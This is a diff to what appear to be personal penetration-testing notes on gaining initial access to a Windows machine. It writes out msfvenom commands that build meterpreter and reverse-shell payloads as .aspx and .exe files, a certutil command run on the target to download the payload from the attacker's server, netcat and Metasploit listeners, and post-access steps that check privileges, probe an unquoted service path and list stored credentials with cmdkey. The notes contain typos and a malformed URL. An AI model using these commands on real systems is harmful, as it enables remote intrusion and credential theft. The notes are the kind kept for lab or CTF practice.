@@ -39,17 +39,17 @@ Now try uploading payload created by msfvenom
 
 msfvenom -l formats
 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=yourip lport=80,443,53,445(prefer or 80) -f aspx -o robensive.aspx 
-or
-msfvenom -p windows/x64/shell_reverse_tcp lhost= lport=8989 -f exe -o test.exe 
+or (2nd method)
+msfvenom -p windows/x64/shell_reverse_tcp lhost= lport=8989,7777 -f exe -o test.exe 
 
 now upload robensive.aspx or test.exe
-For uploading (external)
+For uploading (for 2nd method)
 python3 -m http-server 8000(for running a server from the linux terminal)
 certutil -urlcache -f -split http:://lhost:8000/test.exe test.exe(On target windows command prompt)
 nc -lnvp 8989 (on termainal)
 test.exe
 
-run metasploit listener
+run metasploit listener(for 1st method)
 
 msfdb run 
 uer exploit/multi/handler
@@ -59,10 +59,13 @@ set lport=445(as used before)
 run
 
 Now access robensive.aspx via browser and get meterpreter
+##Completer Initiall Access##
 
 getuid 
 getprivs
-##Completer Initiall Access##
+sc qc unquotedsvc => cd BINARY_PATH_NAME"
+cmdkey /list
+
 
 Enumeration for privsec
 ->some known scripts:
